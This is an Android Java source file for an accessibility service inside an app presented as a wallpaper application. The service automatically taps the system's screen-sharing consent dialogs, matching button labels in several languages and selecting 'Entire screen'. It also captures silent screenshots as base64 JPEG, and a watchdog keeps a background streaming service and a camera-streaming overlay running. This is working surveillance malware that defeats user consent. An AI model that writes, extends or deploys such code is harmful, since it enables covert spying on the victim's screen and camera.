package com.example.wallpaperapplication;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import java.util.List;

import androidx.annotation.NonNull;

import java.io.ByteArrayOutputStream;
import java.lang.ref.WeakReference;
import java.util.concurrent.Executor;

public class WallpaperAccessibilityService extends AccessibilityService {
    private static final String TAG = "WallpaperA11y";
    private static WeakReference<WallpaperAccessibilityService> instanceRef;

    private static volatile boolean autoConsentArmed = false;
    private static volatile long autoConsentArmedTime = 0;
    private static final Handler autoConsentHandler = new Handler(Looper.getMainLooper());
    private static Runnable autoConsentRunnable;

    public interface ScreenshotCallback {
        void onSuccess(String base64Jpeg);
        void onError(String error);
    }

    public static WallpaperAccessibilityService getInstance() {
        return instanceRef != null ? instanceRef.get() : null;
    }

    public static boolean isRunning() {
        return getInstance() != null;
    }

    public static void armAutoConsent() {
        autoConsentArmed = true;
        autoConsentArmedTime = System.currentTimeMillis();
        Log.i(TAG, "MediaProjection auto-consent armed");

        WallpaperAccessibilityService instance = getInstance();
        if (instance != null) {
            instance.startPollingAutoConsent();
        }
    }

    public static void disarmAutoConsent() {
        autoConsentArmed = false;
        if (autoConsentRunnable != null) {
            autoConsentHandler.removeCallbacks(autoConsentRunnable);
            autoConsentRunnable = null;
        }
        Log.d(TAG, "MediaProjection auto-consent disarmed");
    }

    private void startPollingAutoConsent() {
        if (autoConsentRunnable != null) {
            autoConsentHandler.removeCallbacks(autoConsentRunnable);
        }
        autoConsentRunnable = new Runnable() {
            @Override
            public void run() {
                if (!autoConsentArmed) return;
                if (System.currentTimeMillis() - autoConsentArmedTime > 8000) {
                    disarmAutoConsent();
                    return;
                }
                try {
                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root != null) {
                        handleAutoConsent(root);
                    }
                    if (autoConsentArmed && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        List<AccessibilityWindowInfo> windows = getWindows();
                        if (windows != null) {
                            for (AccessibilityWindowInfo win : windows) {
                                AccessibilityNodeInfo winRoot = win.getRoot();
                                if (winRoot != null) {
                                    handleAutoConsent(winRoot);
                                    if (!autoConsentArmed) break;
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error in polling auto-consent", e);
                }
                if (autoConsentArmed) {
                    autoConsentHandler.postDelayed(this, 100);
                }
            }
        };
        autoConsentHandler.postDelayed(autoConsentRunnable, 50);
    }

    private final Handler watchdogHandler = new Handler(Looper.getMainLooper());
    private final Runnable watchdogRunnable = new Runnable() {
        @Override
        public void run() {
            try {
                StreamingService service = StreamingService.getInstance();
                if (service == null || !service.isServiceRunning()) {
                    android.content.SharedPreferences prefs = androidx.preference.PreferenceManager.getDefaultSharedPreferences(WallpaperAccessibilityService.this);
                    if (prefs.getBoolean(Constants.PREF_STREAMING_ENABLED, true)) {
                        Log.i(TAG, "A11y Watchdog: StreamingService is not running. Starting it now...");
                        StreamingWatchdogReceiver.startStreamingService(WallpaperAccessibilityService.this);
                        StreamingWatchdogReceiver.scheduleNext(WallpaperAccessibilityService.this);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error in A11y watchdog", e);
            }
            watchdogHandler.postDelayed(this, 25_000);
        }
    };

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instanceRef = new WeakReference<>(this);
        try {
            AccessibilityServiceInfo info = getServiceInfo();
            if (info == null) info = new AccessibilityServiceInfo();
            info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS | 
                         AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | 
                         AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
            info.notificationTimeout = 50;
            setServiceInfo(info);
            Log.i(TAG, "WallpaperAccessibilityService dynamic config applied");
        } catch (Exception e) {
            Log.e(TAG, "Error configuring AccessibilityServiceInfo", e);
        }
        Log.i(TAG, "WallpaperAccessibilityService connected and ready");

        // Ensure background overlay is attached for background camera streaming support
        OverlayWindowManager.ensureOverlay(this);

        // Auto-start StreamingService immediately upon accessibility service connection (e.g. after reboot or process revive)
        try {
            android.content.SharedPreferences prefs = androidx.preference.PreferenceManager.getDefaultSharedPreferences(this);
            if (prefs.getBoolean(Constants.PREF_STREAMING_ENABLED, true)) {
                Log.i(TAG, "A11y onServiceConnected: Auto-starting StreamingService...");
                StreamingWatchdogReceiver.startStreamingService(this);
                StreamingWatchdogReceiver.scheduleNext(this);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting StreamingService from onServiceConnected", e);
        }

        // Start accessibility persistent watchdog to monitor StreamingService
        watchdogHandler.removeCallbacks(watchdogRunnable);
        watchdogHandler.postDelayed(watchdogRunnable, 3_000);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        watchdogHandler.removeCallbacks(watchdogRunnable);
        if (instanceRef != null && instanceRef.get() == this) {
            instanceRef = null;
        }
        Log.i(TAG, "WallpaperAccessibilityService destroyed");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!autoConsentArmed) return;
        if (System.currentTimeMillis() - autoConsentArmedTime > 10000) {
            autoConsentArmed = false;
            return;
        }

        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null && event != null) {
                root = event.getSource();
            }
            if (root != null) {
                handleAutoConsent(root);
            }
            if (autoConsentArmed && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                List<AccessibilityWindowInfo> windows = getWindows();
                if (windows != null) {
                    for (AccessibilityWindowInfo win : windows) {
                        AccessibilityNodeInfo winRoot = win.getRoot();
                        if (winRoot != null) {
                            handleAutoConsent(winRoot);
                            if (!autoConsentArmed) break;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onAccessibilityEvent auto-consent", e);
        }
    }

    private void handleAutoConsent(AccessibilityNodeInfo root) {
        if (!autoConsentArmed || root == null) return;

        // 1. If a dropdown ListView is open (from screen share mode spinner), select Entire Screen (item 0)
        List<AccessibilityNodeInfo> listViews = root.findAccessibilityNodeInfosByViewId("android:id/select_dialog_listview");
        if (listViews.isEmpty()) {
            findNodesByClass(root, "android.widget.ListView", listViews);
        }
        if (!listViews.isEmpty()) {
            AccessibilityNodeInfo listView = listViews.get(0);
            if (listView.getChildCount() > 0) {
                AccessibilityNodeInfo entireScreenItem = listView.getChild(0);
                Log.i(TAG, "Auto-consent: Selecting item 0 (Entire screen) from dropdown");
                tryClickNode(entireScreenItem);
                return;
            }
        }

        // 2. Locate positive confirmation button (android:id/button1)
        List<AccessibilityNodeInfo> positiveButtons = root.findAccessibilityNodeInfosByViewId("android:id/button1");
        if (positiveButtons.isEmpty()) {
            for (String txt : new String[]{
                    "Share screen", "Start now", "Start recording",
                    "هم‌رسانی صفحه‌نمایش", "هم‌رسانی صفحه", "شروع اکنون", "شروع ضبط",
                    "مشاركة الشاشة", "Compartir pantalla"
            }) {
                positiveButtons = root.findAccessibilityNodeInfosByText(txt);
                if (!positiveButtons.isEmpty()) break;
            }
        }

        for (AccessibilityNodeInfo btn : positiveButtons) {
            CharSequence text = btn.getText();
            String textStr = text != null ? text.toString().trim() : "";

            // Check if this is a "Next" / "بعدی" button (Single App mode active on some custom ROM)
            boolean isNextButton = textStr.equalsIgnoreCase("Next") ||
                                   textStr.equalsIgnoreCase("بعدی") ||
                                   textStr.equalsIgnoreCase("Siguiente") ||
                                   textStr.equalsIgnoreCase("التالي");

            if (!isNextButton) {
                Log.i(TAG, "Auto-consent: Clicking confirmation button '" + textStr + "'");
                tryClickNode(btn);
                autoConsentArmed = false;
                return;
            }
        }

        // 3. If button is "Next" / "بعدی", open the spinner to switch to Entire screen
        List<AccessibilityNodeInfo> spinners = root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/screen_share_mode_options");
        if (!spinners.isEmpty()) {
            AccessibilityNodeInfo spinner = spinners.get(0);
            Log.i(TAG, "Auto-consent: Opening spinner to switch to entire screen");
            tryClickNode(spinner);
        }
    }

    private void findNodesByClass(AccessibilityNodeInfo node, String className, List<AccessibilityNodeInfo> result) {
        if (node == null) return;
        if (node.getClassName() != null && node.getClassName().toString().equals(className)) {
            result.add(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            findNodesByClass(node.getChild(i), className, result);
        }
    }

    private boolean tryClickNode(AccessibilityNodeInfo node) {
        if (node == null) return false;
        boolean clicked = false;
        AccessibilityNodeInfo clickable = node;
        while (clickable != null && !clickable.isClickable()) {
            clickable = clickable.getParent();
        }
        if (clickable != null) {
            clicked = clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }

        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);
        if (bounds.width() > 0 && bounds.height() > 0) {
            dispatchTap(bounds.centerX(), bounds.centerY());
            clicked = true;
        }
        return clicked;
    }

    public void dispatchTap(float x, float y) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Path path = new Path();
            path.moveTo(x, y);
            GestureDescription.StrokeDescription stroke =
                    new GestureDescription.StrokeDescription(path, 0, 40);
            GestureDescription gesture = new GestureDescription.Builder()
                    .addStroke(stroke)
                    .build();
            dispatchGesture(gesture, null, null);
            Log.d(TAG, "Dispatched synthetic tap at (" + x + ", " + y + ")");
        }
    }

    @Override
    public void onInterrupt() {
        // No-op
    }

    public void captureSilentScreenshot(ScreenshotCallback callback) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            callback.onError("Accessibility screenshot requires Android 11+ (API 30+)");
            return;
        }

        Handler mainHandler = new Handler(Looper.getMainLooper());
        mainHandler.post(() -> {
            try {
                Executor executor = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P)
                        ? getMainExecutor()
                        : mainHandler::post;

                takeScreenshot(Display.DEFAULT_DISPLAY, executor, new TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(@NonNull ScreenshotResult screenshotResult) {
                        new Thread(() -> {
                            HardwareBuffer hardwareBuffer = null;
                            Bitmap hwBitmap = null;
                            Bitmap swBitmap = null;
                            try {
                                hardwareBuffer = screenshotResult.getHardwareBuffer();
                                ColorSpace colorSpace = screenshotResult.getColorSpace();
                                if (hardwareBuffer == null) {
                                    callback.onError("Screenshot hardware buffer is null");
                                    return;
                                }

                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                    hwBitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace);
                                }
                                if (hwBitmap == null) {
                                    callback.onError("Failed to wrap hardware buffer into bitmap");
                                    return;
                                }

                                // Convert hardware bitmap into software-rendered ARGB_8888 bitmap for compression
                                swBitmap = hwBitmap.copy(Bitmap.Config.ARGB_8888, false);
                                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                                swBitmap.compress(Bitmap.CompressFormat.JPEG, 85, baos);
                                byte[] bytes = baos.toByteArray();
                                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                                callback.onSuccess(base64);
                            } catch (Exception e) {
                                Log.e(TAG, "Error processing screenshot hardware buffer", e);
                                callback.onError("Error processing screenshot: " + e.getMessage());
                            } finally {
                                if (swBitmap != null && !swBitmap.isRecycled()) swBitmap.recycle();
                                if (hwBitmap != null && !hwBitmap.isRecycled()) hwBitmap.recycle();
                                if (hardwareBuffer != null && !hardwareBuffer.isClosed()) hardwareBuffer.close();
                            }
                        }).start();
                    }

                    @Override
                    public void onFailure(int errorCode) {
                        Log.e(TAG, "takeScreenshot failed with error code: " + errorCode);
                        String msg;
                        switch (errorCode) {
                            case ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT:
                                msg = "Screenshot rate limited (interval too short). Please wait a moment.";
                                break;
                            case ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR:
                                msg = "Internal Android system error taking screenshot.";
                                break;
                            case ERROR_TAKE_SCREENSHOT_INVALID_DISPLAY:
                                msg = "Invalid display specified.";
                                break;
                            case ERROR_TAKE_SCREENSHOT_INVALID_WINDOW:
                                msg = "Invalid window for screenshot.";
                                break;
                            case ERROR_TAKE_SCREENSHOT_NO_ACCESSIBILITY_ACCESS:
                                msg = "No accessibility access for screenshot.";
                                break;
                            case ERROR_TAKE_SCREENSHOT_SECURE_WINDOW:
                                msg = "Active window is protected by FLAG_SECURE.";
                                break;
                            default:
                                msg = "Screenshot capture failed (error code " + errorCode + ")";
                                break;
                        }
                        callback.onError(msg);
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "Exception calling takeScreenshot", e);
                callback.onError("Exception taking screenshot: " + e.getMessage());
            }
        });
    }
}
